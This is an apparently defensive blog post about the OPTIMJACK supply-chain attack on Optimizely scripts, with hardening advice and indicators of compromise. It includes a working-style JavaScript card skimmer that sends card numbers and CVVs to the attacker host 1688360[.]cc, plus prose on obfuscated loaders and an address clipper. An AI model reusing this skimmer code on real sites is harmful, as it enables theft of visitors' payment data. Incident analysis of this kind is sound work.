---
title: "The Optimizely Supply Chain Attack: How Attackers Hijacked Third-Party Scripts to Deliver Card Skimmers and Exploit Kits Across 170+ Brands"
description: "Over 178 enterprise websites—including CNN, the BBC, Zoom, Salesforce, and GitLab—served malicious JavaScript after attackers compromised Optimizely Web Experimentation snippets. Here is a technical breakdown of the OPTIMJACK campaign, why domain-level Content Security Policies failed, and how frontend engineering teams must architect client-side script defenses."
date: 2026-11-18
category: "Web Development"
draft: false
image: "/images/blog/optimizely-supply-chain-attack-javascript-injection.webp"
imageAlt: "Tactile 3D editorial illustration of a midnight-navy browser window module with script tiles flowing along fine tracks, protected by an interlocking amber cryptographic shield on warm cream."
---

In one of the most consequential client-side supply chain compromises of recent years, attackers breached **Optimizely Web Experimentation** and tampered with the core JavaScript bundles served to visitors across more than **178 major global enterprises**.

Dubbed **OPTIMJACK** by security researchers, the incident delivered weaponized JavaScript directly from Optimizely's official Content Delivery Network (`cdn.optimizely.com`) to visitors of high-traffic destinations including **CNN, the BBC, Zoom, Salesforce, GitLab, Equifax, IKEA, Air France-KLM**, and even Optimizely’s own corporate portal and login systems.

Rather than compromising each victim organization individually, the attackers compromised Optimizely's management environment and injected loaders into a configuration field known as **Project JavaScript**. Once saved, Optimizely’s automated CDN pipelines regenerated and distributed the modified client snippets with valid TLS certificates.

The resulting payload executed in hundreds of thousands of end-user browsers, performing **cryptocurrency wallet address swapping**, **credit card skimming on un-isolated checkout forms**, and dynamically provisioning **iOS WebKit exploit kits** (`Coruna` and `DarkSword`) against mobile devices.

This incident exposes a fundamental structural risk in modern web architecture: web applications often execute dozens of third-party SaaS tags in the user's primary execution context with full DOM and cookie privileges.

---

## The Attack Anatomy: How OPTIMJACK Unfolded

Web experimentation and A/B testing platforms work by injecting a dynamic JavaScript snippet into the `<head>` of an application. Whenever a marketing or product manager adjusts a feature flag, test variant, or custom tracking logic, Optimizely's build system compiles the bundle and updates `cdn.optimizely.com/public/<account-id>/s/<project-id>.js`.

```text
[ Attacker Compromises Optimizely Account / API Token ]
                         │
                         ▼ (1) Modifies "Project JavaScript" field across customer projects
[ Optimizely Web Experimentation Build Engine ]
                         │
                         ▼ (2) Compiles and signs snippet with valid CDN certificate
[ cdn.optimizely.com ] (Trusted Domain in Enterprise CSPs)
                         │
       ┌─────────────────┴─────────────────┐
       ▼ (3) Fetched by victim websites    ▼
[ CNN / BBC / Zoom / Salesforce / GitLab / 170+ Enterprises ]
       │
       ▼ (4) Loaded in visitor's browser (Runs with Full DOM Access)
[ Malicious track.js / Injector Executes ]
       ├─► (A) Clipboard & DOM Hijacking: Swaps crypto addresses matching regex
       ├─► (B) Form Skimming: Scrapes un-isolated CC numbers, expiry, & CVV
       └─► (C) iOS Exploit Kit: Loads boot.js & iframes targeting iOS 13–18.7
```

### 1. The Infection Vector: Project JavaScript
According to technical analyses by Report URI and Cynet, the attackers obtained administrative write access to customer projects inside Optimizely. Instead of altering existing experiment logic, the attacker placed a persistent loader inside each project's **Project JavaScript** setting. 

Project JavaScript is an Optimizely feature intended for global tracking scripts and utility functions. Crucially, it executes synchronously on every single page load before any test variations run.

### 2. Loader Variants and Obfuscation
Researchers identified three distinct loader iterations deployed across 188 analyzed snippets:
- **Direct Loader**: Inserted an asynchronous script tag pointing directly to `1688360[.]cc/track.js`.
- **Base64 Obfuscated Loader**: Encoded the remote URL inside an `atob()` decoding string to bypass automated static string scanners looking for known malicious domains.
- **Embedded Fallback Loader**: Injected a compressed inline payload containing the complete clipper and scraper routines to ensure execution even if network firewalls blocked the primary command-and-control (C2) domains.

---

## Inside the Payload: Swappers, Skimmers, and Exploit Kits

Once loaded into the victim’s browser, the primary payload (`track.js`) initialized three specialized attack modules:

### 1. Context-Aware Cryptocurrency Address Clipper
The script hooked into `navigator.clipboard.writeText`, DOM click events, and document input fields. It maintained an active dictionary of regular expressions matching Bitcoin, Ethereum, Solana, and TRON wallet addresses.

To avoid detection, the clipper only activated when an address string appeared adjacent to transactional keywords such as `"wallet"`, `"deposit"`, `"payout"`, or `"send"`. When detected, it substituted the legitimate address with the attacker's pre-configured address while preserving checksum validity.

### 2. Form Field Payment Skimmer
At 13:43 UTC on Monday, the attackers updated the active payload to include a credit card skimmer. The script attached event listeners to all DOM `<form>` and `<input>` elements, listening for 15-to-19-digit numerical sequences that satisfied the Luhn algorithm, accompanied by 3-digit CVV patterns and expiration dates.

```javascript
// Conceptual representation of the DOM form interceptor
document.addEventListener('submit', function(event) {
  const inputs = event.target.querySelectorAll('input');
  let cardData = {};
  inputs.forEach(input => {
    const val = input.value.replace(/\s+/g, '');
    if (/^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})$/.test(val)) {
      cardData.pan = val;
    } else if (/^[0-9]{3,4}$/.test(val) && input.name.toLowerCase().includes('cvv')) {
      cardData.cvv = val;
    }
  });
  if (cardData.pan) {
    // Exfiltrate stolen credit card payload to attacker C2
    navigator.sendBeacon('https://1688360[.]cc/card.php', JSON.stringify(cardData));
  }
}, true);
```

> [!NOTE]
> E-commerce platforms that isolated their checkout inputs using **cross-origin payment iframes** (such as Stripe Elements, Adyen Web Components, or Braintree Hosted Fields) were protected. Because cross-origin iframes are partitioned by the browser's Same-Origin Policy (SOP), malicious scripts running in the top-level window cannot read inputs or listen to events inside the hosted payment frame.

### 3. Mobile Device Fingerprinting & iOS Exploit Kits
For mobile visitors, `track.js` inspected `navigator.userAgent`. If an iOS device was detected, it retrieved a secondary bootstrap script (`boot.js`) hosted on ephemeral `.icu` domains.

The script parsed the operating system version and dynamically generated hidden `<iframe>` containers to execute known browser exploit chains:
- **Coruna Exploit Kit**: Targeted devices running iOS 13.0 through 17.2.1.
- **DarkSword Exploit Kit**: Targeted devices running iOS 18.4 through 18.7.
- **iOS 26 / Modern Versions**: Collected hardware identifiers and WebGL fingerprints without executing an exploit payload.

Between 17:13 and 17:57 UTC, the script enforced an aggressive 60-second page reload loop on iOS 18.6 or older devices to force continuous re-execution of the exploit chain.

---

## Why Standard Content Security Policies (CSP) Failed

Many affected enterprises had production Content Security Policies in place. Yet the payload executed unhindered across their websites. Why?

The primary failure stemmed from **domain-level origin trusting**:

```http
Content-Security-Policy: script-src 'self' https://cdn.optimizely.com https://analytics.google.com;
```

Because Optimizely's legitimate CDN domain was explicitly whitelisted in the header, the browser welcomed the tampered bundle as trusted code. Furthermore:
1. **Dynamic Tag Nature**: Because A/B testing snippets update continuously when marketing teams launch new variations, teams rarely implement **Subresource Integrity (SRI)** hashes (`integrity="sha384-..."`), as any update would immediately trip SRI verification and disable the tag.
2. **CSP Bypasses via `strict-dynamic`**: Environments configured with modern nonce-based CSPs that included `'strict-dynamic'` automatically authorized child scripts spawned by the Optimizely snippet.
3. **Missing `connect-src` Enforcement**: Websites that omitted a strict `connect-src` directive allowed the injected script to exfiltrate stolen card numbers and clipboard data to `1688360[.]cc` via `fetch()`, `XMLHttpRequest`, or `navigator.sendBeacon`.

---

## Actionable Defense Blueprint: Hardening Client-Side Architectures

The OPTIMJACK compromise underscores that frontend engineering teams cannot treat third-party tag providers as implicitly trusted execution partners. To protect web applications against client-side script tampering, implement the following architectural safeguards:

### 1. Isolate Third-Party Tags in Sandboxed Workers
Shift third-party analytics and experimentation tags out of the main browser window using isolated Web Workers. Open-source runtimes like **Partytown** or **Cloudflare Zaraz** execute third-party scripts in a dedicated worker thread with zero direct access to the DOM, clipboard, or local storage.

```html
<!-- Partytown worker isolation prevents direct DOM & clipboard tampering -->
<script type="text/partytown" src="https://cdn.vendor.com/analytics.js"></script>
```

### 2. Isolate Checkout and Financial Inputs via Hosted Iframes
Never capture cardholder details using standard HTML `<input>` tags on an e-commerce checkout page that executes marketing scripts:
- Use **Stripe Elements**, **Braintree Hosted Fields**, or **Adyen Drop-in**.
- These fields render inside cross-origin `<iframe>` documents hosted directly on PCI-DSS certified domains.
- Even if a top-level tag is hijacked by an injection attack, the browser's Same-Origin Policy strictly prohibits the hijacked parent frame from reading card numbers, expiry dates, or CVVs.

### 3. Enforce Strict `connect-src` Directives in CSP
Even if a compromised third-party script runs, prevent it from exfiltrating data to unknown command-and-control servers:

```nginx
# Nginx CSP configuration with strict exfiltration boundaries
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.optimizely.com; connect-src 'self' https://api.yourdomain.com https://log.optimizely.com; frame-src https://js.stripe.com; object-src 'none';" always;
```

### 4. Enforce `HttpOnly` on All Session and Authentication Cookies
The OPTIMJACK script systematically attempted to read `document.cookie` to capture authorization tokens. 
- Ensure that all session cookies, authentication JWTs, and refresh tokens are tagged with `HttpOnly`, `Secure`, and `SameSite=Lax` or `Strict`.
- JavaScript running in the browser cannot read `HttpOnly` cookies, preventing session hijacking during client-side script compromises.

```http
Set-Cookie: session_id=abc123xyz789; Path=/; Secure; HttpOnly; SameSite=Lax
```

### 5. Automated DOM and Subresource Monitoring
Deploy client-side script integrity scanners (such as Report URI, Sentry, or DataDog Client Monitoring) that track:
- Unexpected DOM form listeners.
- Unauthorized mutations to `navigator.clipboard`.
- Hashes of remote JavaScript assets to detect unannounced upstream code changes.

---

## Indicators of Compromise (IoCs)

Enterprise incident response teams should inspect proxy logs, DNS requests, and SIEM records back to Monday morning for the following network and file indicators:

| Indicator Type | Value | Context |
| :--- | :--- | :--- |
| **Domain** | `1688360[.]cc` | Primary C2 payload & exfiltration host |
| **IP Address** | `136.113.106[.]136` | C2 server resolution for `1688360[.]cc` |
| **Domain** | `webshell[.]lol` | Initial injector script source |
| **Domain** | `5vobauua3ojpklx[.]icu` | iOS exploit kit stage delivery |
| **Domain** | `eil786npto9u5bq[.]icu` | iOS exploit kit stage delivery |
| **SHA-256** | `f7b84b9a94f749f8ced3f0112d0a66894e8bbc3b4aa5592021d1b8976a9bad40` | Final `track.js` skimmer/clipper payload |
| **SHA-256** | `617df364120adc47fb4f55dcc0c69a9b6c9e108a92c60bc2b64a266254ab02f3` | Initial `track.js` loader variant |

---

## Primary Sources & References

- **The Hacker News**: [Hijacked Optimizely Scripts Served Card Skimmer and iOS Exploit Kits to CNN, BBC, and Zoom Visitors](https://thehackernews.com/2026/11/hijacked-optimizely-scripts-served-card.html)
- **Report URI Technical Disclosure**: [World's Largest Brands Infected with Malware via Optimizely](https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/)
- **Cynet Security Research**: [OPTIMJACK: Malicious Web Injection Across CNN, Zoom, Salesforce, and Fox](https://www.cynet.com/blog/optimjack-malicious-web-injection-across-cnn-zoom-salesforce-fox-and-more/)
- **StepSecurity Analysis**: [OPTIMJACK: Optimizely-Hosted Scripts Deploy Crypto Clipper and Card Skimmer](https://www.stepsecurity.io/blog/optimjack-optimizely-hosted-scripts-crypto-clipper-card-skimmer)
- **Optimizely Incident Notification**: [Optimizely Trust & Status Advisory](https://status.optimizely.com/incidents/ftw0fh9wx43z)
- **BleepingComputer**: [Massive JavaScript Supply Chain Attack Hits Optimizely CDN](https://www.bleepingcomputer.com/)

---

## Secure Your Web Application's Client-Side Architecture

Third-party scripts, analytics tools, and marketing tags are essential for business growth, but running un-isolated foreign JavaScript introduces critical compliance and security vulnerabilities. If your organization processes customer data or online transactions, a comprehensive client-side architecture review is essential.

I help companies design robust, zero-trust web architectures—from implementing strict Content Security Policies and Subresource Integrity pipelines to isolating client-side scripts and securing payment checkout flows.

Learn more about my [Web Application Development Services](/services/web-applications/), explore my [AI Website Review & Security Auditing](/services/ai-website-review/), or [get in touch for a technical security consultation](/contact/).
